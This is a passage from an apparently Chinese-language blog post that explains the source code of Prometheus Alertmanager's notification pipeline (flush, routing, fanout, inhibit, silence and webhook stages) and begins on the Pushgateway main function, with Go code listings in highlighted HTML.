class="built_in">append</span>(alertsSlice, alert)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ag.mtx.Unlock()</span><br><span class="line"></span><br><span class="line">ag.log.Debugln(<span class="string">"flushing"</span>, alertsSlice)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> notify(alertsSlice...) &#123;</span><br><span class="line">ag.mtx.Lock()</span><br><span class="line"><span class="keyword">for</span> fp, a := <span class="keyword">range</span> alerts &#123;</span><br><span class="line"><span class="comment">// Only delete if the fingerprint has not been inserted</span></span><br><span class="line"><span class="comment">// again since we notified about it.</span></span><br><span class="line"><span class="keyword">if</span> a.Resolved() &amp;&amp; ag.alerts[fp] == a &#123;</span><br><span class="line"><span class="built_in">delete</span>(ag.alerts, fp)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ag.hasSent = <span class="literal">true</span></span><br><span class="line">ag.mtx.Unlock()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>告警的过期时间由alertmanager.yml配置文件中的resolve_timeout配置项指定，默认5m.</p><p>flush方法的notify参数为func(…*types.Alert) bool类型，而notify方法最终会调用d.stage.Exec进行告警处理。</p><p>主要流程：</p><p><img src="/images/1572418713584.png" alt="1572418713584"></p><p>告警通知：</p><p>主要流程：</p><p>1）main方法中调用notify.BuildPipeline方法生成RoutingStage，并作为参数传递到dispatcher的NewDispatcher方法中，从而完成调度器Dispatcher的构建，并将RoutingStage赋值给调度器成stage.</p><p>2）processAlerts定义匿名回调方法func(ctx context.Context, alerts … *types.Alert) bool 再匿名方法的实现调用d.stage.Exec(ctx, alerts…)发送告警。</p><p>BuildPipeline构建一个执行的调用链，该链有RoutingStage，MultiStage,FanoutStage, inhibitStage, SilenceStage, WaitStage, DehupStage等多阶段。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// BuildPipeline builds a map of receivers to Stages.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BuildPipeline</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">confs []*config.Receiver,</span></span></span><br><span class="line"><span class="function"><span class="params">tmpl *template.Template,</span></span></span><br><span class="line"><span class="function"><span class="params">wait <span class="keyword">func</span>()</span> <span class="title">time</span>.<span class="title">Duration</span>,</span></span><br><span class="line">inhibitor *inhibit.Inhibitor,</span><br><span class="line">silences *silence.Silences,</span><br><span class="line">notificationLog nflog.Log,</span><br><span class="line">marker types.Marker,</span><br><span class="line">) RoutingStage &#123;</span><br><span class="line">rs := RoutingStage&#123;&#125;</span><br><span class="line"></span><br><span class="line">is := NewInhibitStage(inhibitor, marker)</span><br><span class="line">ss := NewSilenceStage(silences, marker)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, rc := <span class="keyword">range</span> confs &#123;</span><br><span class="line">rs[rc.Name] = MultiStage&#123;is, ss, createStage(rc, tmpl, wait, notificationLog)&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> rs</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>createStage方法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// createStage creates a pipeline of stages for a receiver.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">createStage</span><span class="params">(rc *config.Receiver, tmpl *template.Template, wait <span class="keyword">func</span>()</span> <span class="title">time</span>.<span class="title">Duration</span>, <span class="title">notificationLog</span> <span class="title">nflog</span>.<span class="title">Log</span>) <span class="title">Stage</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> fs FanoutStage</span><br><span class="line"><span class="keyword">for</span> _, i := <span class="keyword">range</span> BuildReceiverIntegrations(rc, tmpl) &#123;</span><br><span class="line">recv := &amp;nflogpb.Receiver&#123;</span><br><span class="line">GroupName:   rc.Name,</span><br><span class="line">Integration: i.name,</span><br><span class="line">Idx:         <span class="keyword">uint32</span>(i.idx),</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> s MultiStage</span><br><span class="line">s = <span class="built_in">append</span>(s, NewWaitStage(wait))</span><br><span class="line">s = <span class="built_in">append</span>(s, NewDedupStage(notificationLog, recv, i.conf.SendResolved()))</span><br><span class="line">s = <span class="built_in">append</span>(s, NewRetryStage(i))</span><br><span class="line">s = <span class="built_in">append</span>(s, NewSetNotifiesStage(notificationLog, recv))</span><br><span class="line"></span><br><span class="line">fs = <span class="built_in">append</span>(fs, s)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> fs</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BuildReceiverIntegrations方法主要用于构建告警接收器对应的Notifier，兵器再alertmanager.yml配置文件中的每种告警接收器，可以定义多种Notifier。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// BuildReceiverIntegrations builds a list of integration notifiers off of a</span></span><br><span class="line"><span class="comment">// receivers config.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BuildReceiverIntegrations</span><span class="params">(nc *config.Receiver, tmpl *template.Template)</span> []<span class="title">Integration</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">integrations []Integration</span><br><span class="line">add          = <span class="function"><span class="keyword">func</span><span class="params">(name <span class="keyword">string</span>, i <span class="keyword">int</span>, n Notifier, nc notifierConfig)</span></span> &#123;</span><br><span class="line">integrations = <span class="built_in">append</span>(integrations, Integration&#123;</span><br><span class="line">notifier: n,</span><br><span class="line">conf:     nc,</span><br><span class="line">name:     name,</span><br><span class="line">idx:      i,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> nc.WebhookConfigs &#123;</span><br><span class="line">n := NewWebhook(c, tmpl)</span><br><span class="line">add(<span class="string">"webhook"</span>, i, n, c)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> nc.EmailConfigs &#123;</span><br><span class="line">n := NewEmail(c, tmpl)</span><br><span class="line">add(<span class="string">"email"</span>, i, n, c)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> nc.PagerdutyConfigs &#123;</span><br><span class="line">n := NewPagerDuty(c, tmpl)</span><br><span class="line">add(<span class="string">"pagerduty"</span>, i, n, c)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> nc.OpsGenieConfigs &#123;</span><br><span class="line">n := NewOpsGenie(c, tmpl)</span><br><span class="line">add(<span class="string">"opsgenie"</span>, i, n, c)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> nc.SlackConfigs &#123;</span><br><span class="line">n := NewSlack(c, tmpl)</span><br><span class="line">add(<span class="string">"slack"</span>, i, n, c)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> nc.HipchatConfigs &#123;</span><br><span class="line">n := NewHipchat(c, tmpl)</span><br><span class="line">add(<span class="string">"hipchat"</span>, i, n, c)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> nc.VictorOpsConfigs &#123;</span><br><span class="line">n := NewVictorOps(c, tmpl)</span><br><span class="line">add(<span class="string">"victorops"</span>, i, n, c)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i, c := <span class="keyword">range</span> nc.PushoverConfigs &#123;</span><br><span class="line">n := NewPushover(c, tmpl)</span><br><span class="line">add(<span class="string">"pushover"</span>, i, n, c)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> integrations</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以webhook类型Notifier为列，数据格式化之后，以post方式发送告警信息。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Notify implements the Notifier interface.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w *Webhook)</span> <span class="title">Notify</span><span class="params">(ctx context.Context, alerts ...*types.Alert)</span> <span class="params">(<span class="keyword">bool</span>, error)</span></span> &#123;</span><br><span class="line">data := w.tmpl.Data(receiverName(ctx), groupLabels(ctx), alerts...)</span><br><span class="line"></span><br><span class="line">groupKey, ok := GroupKey(ctx)</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line">log.Errorf(<span class="string">"group key missing"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">msg := &amp;WebhookMessage&#123;</span><br><span class="line">Version:  <span class="string">"4"</span>,</span><br><span class="line">Data:     data,</span><br><span class="line">GroupKey: groupKey,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buf bytes.Buffer</span><br><span class="line"><span class="keyword">if</span> err := json.NewEncoder(&amp;buf).Encode(msg); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">req, err := http.NewRequest(<span class="string">"POST"</span>, w.URL, &amp;buf)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>, err</span><br><span class="line">&#125;</span><br><span class="line">req.Header.Set(<span class="string">"Content-Type"</span>, contentTypeJSON)</span><br><span class="line">req.Header.Set(<span class="string">"User-Agent"</span>, userAgentHeader)</span><br><span class="line"></span><br><span class="line">resp, err := ctxhttp.Do(ctx, http.DefaultClient, req)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>, err</span><br><span class="line">&#125;</span><br><span class="line">resp.Body.Close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> w.retry(resp.StatusCode)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用链的执行流程：</p><p><img src="/images/1572419260049.png" alt="1572419260049"></p><p>RoutingStage阶段的Exec方法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Exec implements the Stage interface.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(rs RoutingStage)</span> <span class="title">Exec</span><span class="params">(ctx context.Context, alerts ...*types.Alert)</span> <span class="params">(context.Context, []*types.Alert, error)</span></span> &#123;</span><br><span class="line">receiver, ok := ReceiverName(ctx)</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">return</span> ctx, <span class="literal">nil</span>, fmt.Errorf(<span class="string">"receiver missing"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s, ok := rs[receiver]</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">return</span> ctx, <span class="literal">nil</span>, fmt.Errorf(<span class="string">"stage for receiver missing"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> s.Exec(ctx, alerts...)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Exec attempts to execute all stages concurrently and discards the results.</span></span><br><span class="line"><span class="comment">// It returns its input alerts and a types.MultiError if one or more stages fail.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(fs FanoutStage)</span> <span class="title">Exec</span><span class="params">(ctx context.Context, alerts ...*types.Alert)</span> <span class="params">(context.Context, []*types.Alert, error)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">wg sync.WaitGroup</span><br><span class="line">me types.MultiError</span><br><span class="line">)</span><br><span class="line">wg.Add(<span class="built_in">len</span>(fs))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, s := <span class="keyword">range</span> fs &#123;</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(s Stage)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> _, _, err := s.Exec(ctx, alerts...); err != <span class="literal">nil</span> &#123;</span><br><span class="line">me.Add(err)</span><br><span class="line">log.Errorf(<span class="string">"Error on notify: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">wg.Done()</span><br><span class="line">&#125;(s)</span><br><span class="line">&#125;</span><br><span class="line">wg.Wait()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> me.Len() &gt; <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> ctx, alerts, &amp;me</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ctx, alerts, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Exec implements the Stage interface.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(ms MultiStage)</span> <span class="title">Exec</span><span class="params">(ctx context.Context, alerts ...*types.Alert)</span> <span class="params">(context.Context, []*types.Alert, error)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> err error</span><br><span class="line"><span class="keyword">for</span> _, s := <span class="keyword">range</span> ms &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(alerts) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> ctx, <span class="literal">nil</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctx, alerts, err = s.Exec(ctx, alerts...)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> ctx, <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ctx, alerts, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>告警抑制的配置，inhibit_rules配置项目：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Exec implements the Stage interface.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(n *InhibitStage)</span> <span class="title">Exec</span><span class="params">(ctx context.Context, alerts ...*types.Alert)</span> <span class="params">(context.Context, []*types.Alert, error)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> filtered []*types.Alert</span><br><span class="line"><span class="keyword">for</span> _, a := <span class="keyword">range</span> alerts &#123;</span><br><span class="line">_, ok := n.marker.Inhibited(a.Fingerprint())</span><br><span class="line"><span class="comment">// TODO(fabxc): increment total alerts counter.</span></span><br><span class="line"><span class="comment">// Do not send the alert if the silencer mutes it.</span></span><br><span class="line"><span class="keyword">if</span> !n.muter.Mutes(a.Labels) &#123;</span><br><span class="line"><span class="comment">// TODO(fabxc): increment muted alerts counter.</span></span><br><span class="line">filtered = <span class="built_in">append</span>(filtered, a)</span><br><span class="line"><span class="comment">// Store whether a previously inhibited alert is firing again.</span></span><br><span class="line">a.WasInhibited = ok</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ctx, filtered, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>告警静音：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Exec implements the Stage interface.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(n *SilenceStage)</span> <span class="title">Exec</span><span class="params">(ctx context.Context, alerts ...*types.Alert)</span> <span class="params">(context.Context, []*types.Alert, error)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> filtered []*types.Alert</span><br><span class="line"><span class="keyword">for</span> _, a := <span class="keyword">range</span> alerts &#123;</span><br><span class="line">_, ok := n.marker.Silenced(a.Fingerprint())</span><br><span class="line"><span class="comment">// TODO(fabxc): increment total alerts counter.</span></span><br><span class="line"><span class="comment">// Do not send the alert if the silencer mutes it.</span></span><br><span class="line">sils, err := n.silences.Query(</span><br><span class="line">silence.QState(silence.StateActive),</span><br><span class="line">silence.QMatches(a.Labels),</span><br><span class="line">)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Errorf(<span class="string">"Querying silences failed: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sils) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="comment">// TODO(fabxc): increment muted alerts counter.</span></span><br><span class="line">filtered = <span class="built_in">append</span>(filtered, a)</span><br><span class="line">n.marker.SetSilenced(a.Labels.Fingerprint())</span><br><span class="line"><span class="comment">// Store whether a previously silenced alert is firing again.</span></span><br><span class="line">a.WasSilenced = ok</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">ids := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="built_in">len</span>(sils))</span><br><span class="line"><span class="keyword">for</span> i, s := <span class="keyword">range</span> sils &#123;</span><br><span class="line">ids[i] = s.Id</span><br><span class="line">&#125;</span><br><span class="line">n.marker.SetSilenced(a.Labels.Fingerprint(), ids...)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ctx, filtered, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Pushgateway"><a href="#Pushgateway" class="headerlink" title="Pushgateway"></a>Pushgateway</h2><p>pushgateway主要作用是允许临时任务和批作业向prometheus公开指标数据。主要用于短期的 jobs。由于这类 jobs 存在时间较短，可能在 Prometheus 来 pull 之前就消失了。为此，这次 jobs 可以直接向 Prometheus server 端推送它们的 metrics。这种方式主要用于服务层面的 metrics，对于机器层面的 metrices，需要使用 node exporter。</p><p>push gateway的代码逻辑都再main函数里面：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">app = kingpin.New(filepath.Base(os.Args[<span class="number">0</span>]), <span class="string">"The Pushgateway"</span>)</span><br><span class="line"></span><br><span class="line">listenAddress       = app.Flag(<span class="string">"web.listen-address"</span>, <span class="string">"Address to listen on for the web interface, API, and telemetry."</span>).Default(<span class="string">":9091"</span>).String()</span><br><span class="line">metricsPath         = app.Flag(<span class="string">"web.telemetry-path"</span>, <span class="string">"Path under which to expose metrics."</span>).Default(<span class="string">"/metrics"</span>).String()</span><br><span class="line">externalURL         = app.Flag(<span class="string">"web.external-url"</span>, <span class="string">"The URL under which the Pushgateway is externally reachable."</span>).Default(<span class="string">""</span>).URL()</span><br><span class="line">routePrefix         = app.Flag(<span class="string">"web.route-prefix"</span>, <span class="string">"Prefix for the internal routes of web endpoints. Defaults to the path of --web.external-url."</span>).Default(<span class="string">""</span>).String()</span><br><span class="line">enableLifeCycle     = app.Flag(<span class="string">"web.enable-lifecycle"</span>, <span class="string">"Enable shutdown via HTTP request."</span>).Default(<span class="string">"false"</span>).Bool()</span><br><span class="line">enableAdminAPI      = app.Flag(<span class="string">"web.enable-admin-api"</span>, <span class="string">"Enable API endpoints for admin control actions."</span>).Default(<span class="string">"false"</span>).Bool()</span><br><span class="line">persistenceFile     = app.Flag(<span class="string">"persistence.file"</span>, <span class="string">"File to persist metrics. If empty, metrics are only kept in memory."</span>).Default(<span class="string">""</span>).String()</span><br><span class="line">persistenceInterval = app.Flag(<span class="string">"persistence.interval"</span>, <span class="string">"The minimum interval at which to write out the persistence file."</span>).Default(<span class="string">"5m"</span>).Duration()</span><br><span class="line">promlogConfig       = promlog.Config&#123;&#125;</span><br><span class="line">)</span><br><span class="line">promlogflag.AddFlags(app, &amp;promlogConfig)</span><br><span class="line">app.Version(version.Print(<span class="string">"pushgateway"</span>))</span><br><span class="line">app.HelpFlag.Short(<span class="string">'h'</span>)</span><br><span class="line">kingpin.MustParse(app.Parse(os.Args[<span class="number">1</span>:]))</span><br><span class="line">logger := promlog.New(&amp;promlogConfig)</span><br><span class="line"></span><br><span class="line">*routePrefix = computeRoutePrefix(*routePrefix, *externalURL)</span><br><span class="line">externalPathPrefix := computeRoutePrefix(<span class="string">""</span>, *externalURL)</span><br><span class="line"></span><br><span class="line">level.Info(logger).Log(<span class="string">"msg"</span>, <span class="string">"starting pushgateway"</span>, <span class="string">"version"</span>, version.Info())</span><br><span class="line">level.Info(logger).Log(<span class="string">"build_context"</span>, version.BuildContext())</span><br><span class="line">level.Debug(logger).Log(<span class="string">"msg"</span>, <span class="string">"external URL"</span>, <span class="string">"url"</span>, *externalURL)</span><br><span class="line">level.Debug(logger).Log(<span class="string">"msg"</span>, <span class="string">"path prefix used externally"</span>, <span class="string">"path"</span>, externalPathPrefix)</span><br><span class="line">level.Debug(logger).Log(<span class="string">"msg"</span>, <span class="string">"path prefix for internal routing"</span>, <span class="string">"path"</span>, *routePrefix)</span><br><span class="line"></span><br><span class="line"><span class="comment">// flags is used to show command line flags on the status page.</span></span><br><span class="line"><span class="comment">// Kingpin default flags are excluded as they would be confusing.</span></span><br><span class="line">flags := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>&#123;&#125;</span><br><span class="line">boilerplateFlags := kingpin.New(<span class="string">""</span>, <span class="string">""</span>).Version(<span class="string">""</span>)</span><br><span class="line"><span class="keyword">for</span> _, f := <span class="keyword">range</span> app.Model().Flags &#123;</span><br><span class="line"><span class="keyword">if</span> boilerplateFlags.GetFlag(f.Name) == <span class="literal">nil</span> &#123;</span><br><span class="line">flags[f.Name] = f.Value.String()</span><br><span 